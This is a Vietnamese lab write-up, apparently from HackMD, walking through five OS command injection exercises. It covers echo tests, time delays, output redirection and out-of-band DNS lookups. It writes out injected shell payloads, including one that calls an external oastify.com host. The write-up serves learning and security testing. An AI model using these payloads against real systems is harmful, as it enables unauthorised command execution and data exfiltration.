# Số bài giải / Tổng số: 5/5
# **1. Lab: File path traversal, simple case**
> Mô tả nói rằng bài lab chứa lỗ hổng OS command injection ở phần kiểm tra số lượng hàng trong kho.
![image](https://hackmd.io/_uploads/rkiWf79g0.png)

>Truy cập và dùng thử chức năng `Check stock` của trang web và quan sát request trong HTTP History:
![image](https://hackmd.io/_uploads/rycUNQqgR.png)

>Thấy có 1 request với method POST tới server, ta sẽ đi phân tích request này: ![image](https://hackmd.io/_uploads/BkkdrmceA.png)

>Request này sẽ truyền đi 2 tham số `productID` và `storeID` để yêu cầu và server sẽ trả về số lượng để render lên hiển thị:
>![image](https://hackmd.io/_uploads/rJaBIX5lR.png)

>Thêm `echo 123;` vào sau 2 tham số này để test, và phản hồi nhận lại được nhưng không hiển thị ra kết quả mong muốn: ![image](https://hackmd.io/_uploads/Hyv3FQqlA.png)

>Nghi ngờ rằng server không lọc đầu vào khi xử lí. Thử đổi `&` thành `||` và gửi lại và nhận được phản hồi: ![image](https://hackmd.io/_uploads/Hy38cmceA.png)

>Thông báo lỗi cho ta biết rằng ta thực thi lệnh shell thành công! Bây giờ thì đổi payload thành `whoami` theo yêu cầu đề bài: ![image](https://hackmd.io/_uploads/By98j79xA.png)

>Màn hình không hiển thị kết quả của `whoami` nhưng bên phía lab thông báo đã hoàn thành bài lab => chứng tỏ đã thực thi lệnh thành công!![image](https://hackmd.io/_uploads/B1sts7cgC.png)

# **2. Lab: Blind OS command injection with time delays**
>  Mô tả nói rằng bài lab chứa lỗ hổng OS command injection ở chức năng feedback. Ứng dụng thực thi lệnh shell chứa các chi tiết do người dùng cung cấp. Đầu ra từ lệnh không được trả về trong phản hồi. Nhiệm vụ của chúng ta là khai thác lỗ hổng này và làm cho phản hồi bị delay 10 giây: 
![image](https://hackmd.io/_uploads/Sy4Ky8ceR.png)

>Truy cập bài lab và có phần **"Submit feedback"** : ![image](https://hackmd.io/_uploads/SJS5WL5g0.png)

>Thử điền giá trị ngẫu nhiên và submit feedback, quan sát bên HTTP History có 1 request với method **POST** đươc gửi đi:
![image](https://hackmd.io/_uploads/B19bMUqeR.png)

> Theo đề bài. ứng dụng phía máy chủ sẽ tạo một email gửi đến quản trị viên trang web chứa phản hồi. Để thực hiện việc này, nó gọi tới chương trình thư với các chi tiết đã gửi, có dạng như sau:
> `mail -s "test" -aFrom:ducanh@gmail.com feedback@vulnerable-website.com
`
>Có thể thấy rằng ở phần nhập email, ta có thể chèn vào đó lệnh tùy ý...Vì đầu ra của lệnh `mail` sẽ không trả về trong phản hồi của server nên ta không dùng `echo` được. Thay vào đó, để đáp ứng yêu cầu đề, ta có thể chèn lệnh `ping` với cú pháp payload mới như sau: 
> `mail -s "test" -aFrom:ducanh@gmail.com || ping -c 10 127.0.0.1 || feedback@vulnerable-website.com`
> Khi đó, server sẽ thực hiện ping 10 lần đến địa chỉ localhost và từ đó khiến response trả về sau 10 giây.

> Thực hiện URL-encode payload: ![image](https://hackmd.io/_uploads/BJ4O4I5g0.png)

>Sửa đổi input email trong Repeater và Send: ![image](https://hackmd.io/_uploads/HyJjE8qxR.png)

>Server trả về respone **"200 OK"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/S1ufSIqeA.png)

# **3. Lab: Blind OS command injection with output redirection**
>Mô tả nói rằng bài lab chứa lỗ hổng OS command injection ở chức năng feedback. Ứng dụng thực thi lệnh shell chứa các chi tiết do người dùng cung cấp. Đầu ra từ lệnh không được trả về trong phản hồi. Nhiệm vụ của chúng ta là chuyển hướng được kết quả vào 1 thư mục được cấp quyền ghi `/var/www/images` và tiến hành đọc nội dung của lệnh `whoami` trong thư mục đó để hoàn thành bài lab: 
![image](https://hackmd.io/_uploads/HytABLqgR.png)

>Tiếp tục và phần submit feedback của người dùng như lab trước:
>![image](https://hackmd.io/_uploads/ryHD8U5eR.png)

>Tiến hành inject vào input email được gửi đi, tiến hành ghi nội dung của `whoami` vào trong thư mục `/var/www/images` bằng payload: 
>`ducanh@gmail.com || whoami > /var/www/images/output.txt ||`

>Tiến hành URL-encode payload: ![image](https://hackmd.io/_uploads/HyFrO89xC.png)

>Sửa đổi giá trị email trong request **POST** gửi đi, và nhận được phản hồi **"200 OK"** tức là đã thành công:
>![image](https://hackmd.io/_uploads/SyH5OIcxA.png)
 
> Cuối cùng là vào 1 request fetch ảnh từ server bất kì, sửa đổi giá trị `filename` để trỏ tới file `output.txt` mà ta vừa tạo: ![image](https://hackmd.io/_uploads/B1z1KUcxR.png)

>Nhận được phản hồi **"200 OK"** cùng với nội dung file là tên người dùng hiện thời! Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SJCmFUcgA.png)

# **4. Lab: Blind OS command injection with out-of-band interaction**
>Mô tả nói rằng bài lab chứa lỗ hổng OS command injection ở chức năng feedback. Ứng dụng thực thi lệnh shell chứa các chi tiết do người dùng cung cấp. Đầu ra từ lệnh không được trả về trong phản hồi. Và việc thực hiện ghi output lên 1 địa chỉ mong muốn cũng không khá thi. Tuy nhiên, ta có thể sử dụng kĩ thuật tương tác ngoài băng tần với 1 external domain, cụ thể là Burp Collaborator:
![image](https://hackmd.io/_uploads/ryUPFU9x0.png)

>Truy cập bài lab và thấy có chức năng "Submit feedback": ![image](https://hackmd.io/_uploads/H1nKjU9x0.png)

>Thử điền giá trị ngẫu nhiên và submit, quan sát thấy 1 request với method **POST** được gửi đi, kèm theo các giá trị ta vừa nhập: 
>![image](https://hackmd.io/_uploads/HyglhL9eC.png)

>Tiến hành inject vào input email được gửi đi như các lab trước, thực hiện tra cứu DNS cho mạng external của ta bằng payload: 
>`|| nslookup eo641iitiax0b1fejep34l3zoquhi76w.oastify.com ||`

>Thực hiện URL-encode cho payload: ![image](https://hackmd.io/_uploads/SyiyTU5x0.png)

>Trong Repeater, sửa đổi input email và thực hiện Send: ![image](https://hackmd.io/_uploads/HyJMTI5eA.png)

>Server phản hồi **"200 OK"**, đồng thời bên phía Burp Collaborator cũng nhận được các request tra cứu gửi tới: ![image](https://hackmd.io/_uploads/SJePTL9eC.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rkTDTIqe0.png)

# **5. Lab: Blind OS command injection with out-of-band data exfiltration**
> Mô tả nói rằng bài lab chứa lỗ hổng OS command injection ở chức năng feedback. Ứng dụng thực thi lệnh shell chứa các chi tiết do người dùng cung cấp. Đầu ra từ lệnh không được trả về trong phản hồi. Và việc thực hiện ghi output lên 1 địa chỉ mong muốn cũng không khá thi. Tuy nhiên, ta có thể sử dụng kĩ thuật tương tác ngoài băng tần với 1 external domain, cụ thể là Burp Collaborator. Để hoàn thành bài lab, ta phải thực thi được lệnh `whoami` để lấy được tên người dùng hiện thời và submit:
![image](https://hackmd.io/_uploads/B13jaL5lA.png)

>Truy cập bài lab và thấy có chức năng "Submit feedback":
>![image](https://hackmd.io/_uploads/SJCNxwclA.png)

>Thử điền giá trị ngẫu nhiên và submit, quan sát thấy 1 request với method **POST** được gửi đi, kèm theo các giá trị ta vừa nhập: 
![image](https://hackmd.io/_uploads/Hk5Ogv9gA.png)

>Tiến hành inject vào input email được gửi đi như các lab trước, thực hiện tra cứu DNS cho mạng external của ta, đồng thời gửi đi cả tên user bằng payload: 
![image](https://hackmd.io/_uploads/ryBDGw9gR.png)

>Thực hiện URL-encode cho payload:![image](https://hackmd.io/_uploads/HJvVWPqgA.png)

> Trong Repeater, sửa đổi input email và thực hiện Send:![image](https://hackmd.io/_uploads/r1VvZw5xR.png)

>Server phản hồi **"200 OK"**, đồng thời bên phía Burp Collaborator cũng nhận được các request tra cứu gửi tới: ![image](https://hackmd.io/_uploads/B1Fq-vclR.png)

>Dễ dàng lấy được tên người dùng là **peter-o0tQp6**. Tiến hành submit: ![image](https://hackmd.io/_uploads/ryqR-w9gA.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/r1hkzD5x0.png)
